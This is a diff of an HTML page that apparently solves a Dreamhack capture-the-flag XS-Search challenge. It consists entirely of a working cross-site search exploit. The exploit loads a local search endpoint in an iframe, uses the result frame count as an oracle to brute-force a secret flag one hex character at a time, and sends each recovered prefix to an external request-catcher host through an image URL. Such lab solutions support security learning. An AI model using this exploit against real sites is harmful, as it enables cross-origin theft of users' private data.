@@ -4,14 +4,49 @@
   <title>Dreamhack(XS-Search)</title>
 </head>
 <body>
-  <iframe id="iframe"></iframe>
-  <img id="img">
-  <script>
-    const iframe = document.getElementById("iframe");
-    iframe.src = "http://localhost:8000/search?query=DH{";
-    iframe.onload = () => {
-        img.src = `https://ivvrwfr.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
-    };
-  </script>
+
+<iframe id="frame"></iframe>
+<img id="img">
+<script>
+    function req(url) {
+        return new Promise((resolve, reject) => {
+            var iframe = document.getElementById("frame");
+            iframe.src = url;
+
+            iframe.onload = () => { 
+                if(iframe.contentWindow.frames.length>=1) resolve();
+                else reject();
+            };
+        });
+    }
+
+    async function sendrequest(query) {
+        try {
+            await req("http://localhost:8000/search?query="+query);
+            return true;
+        } catch(e) {
+            return false;
+        }
+    }
+
+    var flag = "DH{"
+    var charset = "0123456789abcdef"
+
+    async function exploit() {
+        for(var i=0; i<32; i++) {
+            for(const ch of charset) {
+                if(await sendrequest(flag+ch)) {
+                    flag += ch;
+                    var img = document.getElementById("img");
+                    img.src = "https://ena4gusnyxj5.x.pipedream.net/?"+flag;
+                    break;
+                }
+            }
+        }
+    }
+
+    exploit()
+</script>
+
 </body>
 </html>
